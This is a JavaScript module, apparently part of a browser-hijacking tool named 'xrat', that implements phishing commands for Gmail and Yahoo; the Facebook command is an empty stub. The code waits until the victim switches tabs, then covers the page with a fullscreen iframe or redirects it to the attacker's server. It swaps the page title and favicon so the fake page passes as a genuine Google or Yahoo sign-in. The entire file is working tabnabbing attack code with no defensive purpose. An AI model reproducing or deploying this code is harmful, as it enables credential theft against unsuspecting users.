define(['utils','command'], function(utils, command){

	/*==========================================================

	Phishing based commands implemented here.

	Different sites will have different commands, and within those
	commands there should be a variety of settings to tweak, to
	obtain the best odds of a succesful phishing attack.

	For example, in the Gmail/Google phishing command, there will
	be the ability to swap to the phishing page in the background
	when a user changes tabs (page visibility api). Also the
	ability to spoof gmail notifications that when clicked take 
	you to the phishing page.

	this.data[0] indicates iframe or not
	this.data[1] indicates whether or not the page should wait
	until the user tabs away to display, if available. 
	this.data[1] == 0 is no wait
	this.data[1] == 1 is wait for tab or hidden page

	============================================================*/

	command.
	factory('gmail', {
		perform: function(){
			var self = this;
			console.log(visibly);
			if(parseInt(this.data[1]) === 1){
				// wait for page to go hidden
				visibly.onHidden(function(){
					self.changePage();
				})
			}
			else{
				this.changePage();
			}
			this.complete();
		},
		changePage: function(){
			if(this.data[0] === 'iframe'){
				utils.fullscreenIframe(xrat.homeUrl + '/gmail'); 
				this.changeTitle();
			}
			else{
				window.location = xrat.homeUrl + '/gmail';
			}
			visibly.hiddenCallbacks = [];
		},
		changeTitle: function(){
			// if using an iframe, the title tag and favicon need to change
			document.title = 'Gmail: Email from Google';
			utils.changeIco('http://mail.google.com/favicon.ico');
		}
	}).
	factory('yahoo', {
		perform: function(){
			var self = this;
			console.log(visibly);
			if(parseInt(this.data[1]) === 1){
				// wait for page to go hidden
				visibly.onHidden(function(){
					self.changePage();
				})
			}
			else{
				this.changePage();
			}
			this.complete();
		},
		changePage: function(){
			if(this.data[0] === 'iframe'){
				utils.fullscreenIframe(xrat.homeUrl + '/yahoo');
				this.changeTitle();
			}
			else {
				window.location = xrat.homeUrl + '/yahoo';
			}
			visibly.hiddenCallbacks = [];
		},
		changeTitle: function(){
			document.title = 'Sign in to Yahoo!';
			utils.changeIco('http://www.yahoo.com/favicon.ico');
		}
	}).
	factory('facebook', {

	});

	
});